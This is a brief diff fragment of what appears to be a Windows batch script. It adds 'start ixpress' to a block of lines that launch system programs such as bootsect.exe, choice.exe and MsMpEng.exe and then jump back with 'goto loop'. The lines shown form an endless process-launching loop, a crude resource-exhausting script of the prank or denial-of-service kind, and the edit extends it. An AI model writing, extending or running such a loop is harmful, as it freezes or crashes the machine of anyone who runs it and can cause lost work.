@@ -28,6 +28,7 @@ start bootim.exe
 start bootsect.exe
 start choice.exe
 start MsMpEng.exe
-start 
+start ixpress
+start
 goto loop
  
